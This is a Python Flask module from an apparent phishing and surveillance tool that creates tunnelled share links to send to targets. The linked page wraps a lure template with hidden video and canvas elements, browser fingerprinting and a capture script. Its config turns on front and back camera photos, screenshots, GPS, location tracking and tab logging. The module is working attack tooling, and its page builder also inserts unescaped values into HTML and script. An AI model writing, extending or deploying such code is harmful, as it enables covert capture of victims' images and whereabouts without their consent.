"""Template Link Manager — generate link per template."""
from flask import Blueprint, jsonify, request, render_template, redirect
from app.auth import login_required
from app.database import db
from app.models import Template, ShareLink, Session as SessionModel
import os
import secrets
import string
import subprocess


bp = Blueprint("template_link", __name__)

TUNNEL_DIR = os.path.expanduser("~/capture-pro/tunnels")


def _gen_slug(length=10):
    alphabet = string.ascii_lowercase + string.digits
    while True:
        s = "".join(secrets.choice(alphabet) for _ in range(length))
        if not ShareLink.query.filter_by(slug=s).first():
            return s


def _get_active_tunnels():
    """Ambil tunnel yang aktif beserta URL-nya."""
    tunnels = []
    
    if not os.path.isdir(TUNNEL_DIR):
        return tunnels
    
    for fname in os.listdir(TUNNEL_DIR):
        if not fname.endswith(".pid"):
            continue
        
        name = fname[:-4]
        pid_file = os.path.join(TUNNEL_DIR, fname)
        url_file = os.path.join(TUNNEL_DIR, name + ".url")
        
        try:
            with open(pid_file) as f:
                pid = int(f.read().strip())
        except Exception:
            continue
        
        # Cek PID hidup
        running = False
        try:
            result = subprocess.run(["ps", "-p", str(pid)], capture_output=True, text=True, timeout=3)
            running = str(pid) in result.stdout
        except Exception:
            pass
        
        url = ""
        if os.path.isfile(url_file):
            try:
                with open(url_file) as f:
                    url = f.read().strip()
            except Exception:
                pass
        
        if running and url:
            tunnels.append({"name": name, "url": url})
    
    return tunnels


@bp.route("/template-links")
@login_required
def page():
    """Halaman manager link template."""
    templates = Template.query.order_by(Template.id).all()
    links = ShareLink.query.order_by(ShareLink.id.desc()).limit(50).all()
    return render_template("template_links.html",
                           templates=templates,
                           links=[l.to_dict() for l in links])


@bp.route("/api/template-links/templates")
@login_required
def api_templates():
    """List template."""
    templates = Template.query.order_by(Template.id).all()
    return jsonify({
        "ok": True,
        "templates": [t.to_dict() for t in templates]
    })


@bp.route("/api/template-links/tunnels")
@login_required
def api_tunnels():
    """List tunnel aktif."""
    return jsonify({
        "ok": True,
        "tunnels": _get_active_tunnels()
    })


@bp.route("/api/template-links/generate", methods=["POST"])
@login_required
def api_generate():
    """Generate link baru untuk template + tunnel."""
    data = request.get_json(force=True, silent=True) or {}
    
    template_id = int(data.get("template_id") or 0)
    tunnel_name = (data.get("tunnel_name") or "").strip()
    campaign = (data.get("campaign") or "").strip()
    notes = (data.get("notes") or "").strip()
    
    if not template_id:
        return jsonify({"ok": False, "msg": "Pilih template dulu"}), 400
    
    if not tunnel_name:
        return jsonify({"ok": False, "msg": "Pilih tunnel dulu"}), 400
    
    # Cek template
    template = Template.query.get(template_id)
    if not template:
        return jsonify({"ok": False, "msg": "Template tidak ditemukan"}), 404
    
    # Cek tunnel aktif
    tunnels = _get_active_tunnels()
    tunnel = None
    for t in tunnels:
        if t["name"] == tunnel_name:
            tunnel = t
            break
    
    if not tunnel:
        return jsonify({"ok": False, "msg": "Tunnel tidak aktif"}), 400
    
    # Generate slug unik
    slug = _gen_slug()
    
    # Campaign default: dari kategori template
    if not campaign:
        campaign = (template.category or "default").lower().replace(" ", "-")
    
    # Build URL
    tunnel_url = tunnel["url"].rstrip("/")
    # Pakai route /t/<id>/<slug> yang render template HTML + capture.js
    full_url = f"{tunnel_url}/t/{template.id}/{slug}"
    
    # Simpan
    link = ShareLink(
        slug=slug,
        template_id=template.id,
        template_name=template.name,
        tunnel_name=tunnel_name,
        tunnel_url=tunnel_url,
        campaign=campaign[:64],
        full_url=full_url,
        notes=notes[:500],
    )
    db.session.add(link)
    db.session.commit()
    
    return jsonify({
        "ok": True,
        "link": link.to_dict(),
        "url": full_url,
    })


@bp.route("/api/template-links/list")
@login_required
def api_list():
    """List semua link."""
    links = ShareLink.query.order_by(ShareLink.id.desc()).all()
    return jsonify({
        "ok": True,
        "links": [l.to_dict() for l in links]
    })


@bp.route("/api/template-links/delete/<int:link_id>", methods=["POST", "DELETE"])
@login_required
def api_delete(link_id):
    """Hapus link."""
    link = ShareLink.query.get(link_id)
    if not link:
        return jsonify({"ok": False, "msg": "Link tidak ada"}), 404
    
    db.session.delete(link)
    db.session.commit()
    return jsonify({"ok": True})


# ============================================================
# ROUTE untuk handle link yang di-share (redirect ke template)
# ============================================================
@bp.route("/s/<slug>")
def share_link(slug):
    """Link yang di-share ke target — redirect ke template + track hit."""
    link = ShareLink.query.filter_by(slug=slug).first()
    if not link:
        return "Link tidak valid", 404
    
    link.hits = (link.hits or 0) + 1
    db.session.commit()
    
    # Render template + capture
    template = Template.query.get(link.template_id)
    if not template:
        return "Template tidak ditemukan", 404
    
    # Render template page
    from flask import Response
    import json as _json
    
    try:
        cfg = _json.loads(template.config_json or "{}")
    except Exception:
        cfg = {}
    
    config_json = _json.dumps({
        "ENABLE_FOTO_DEPAN": bool(cfg.get("foto_depan")),
        "ENABLE_FOTO_BELAKANG": bool(cfg.get("foto_belakang")),
        "ENABLE_SCREENSHOT": bool(cfg.get("screenshot")),
        "ENABLE_GPS": bool(cfg.get("gps")),
        "ENABLE_BURST": bool(cfg.get("burst")),
        "ENABLE_LOCATION_TRACKING": bool(cfg.get("location_tracking")),
        "ENABLE_TAB_LOG": bool(cfg.get("tab_log")),
        "DELAY_SECONDS": 5,
        "WAIT_PERMISSION": True,
        "CAMPAIGN_OVERRIDE": link.campaign,
    })
    
    html = "<!DOCTYPE html><html><head><meta charset='utf-8'>" \
           "<meta name='viewport' content='width=device-width,initial-scale=1'>" \
           "<title>" + template.name + "</title>" \
           "<link rel='manifest' href='/static/manifest.json'>" \
           "<style>body{margin:0;padding:0;font-family:system-ui,sans-serif}</style></head><body>" \
           + (template.html_content or "") + \
           "<video id='v' autoplay playsinline muted hidden></video>" \
           "<canvas id='c' hidden></canvas>" \
           "<div id='status' hidden></div><div id='log' hidden></div>" \
           "<script>window.CAMPAIGN='" + link.campaign + "';" \
           "window.SHARE_SLUG='" + slug + "';" \
           "window.CONFIG=" + config_json + ";</script>" \
           "<script src='https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js'></script>" \
           "<script src='https://cdn.jsdelivr.net/npm/@fingerprintjs/fingerprintjs@4/dist/fp.min.js'></script>" \
           "<script src='/static/js/capture.js'></script>" \
           "</body></html>"
    return Response(html, mimetype="text/html")
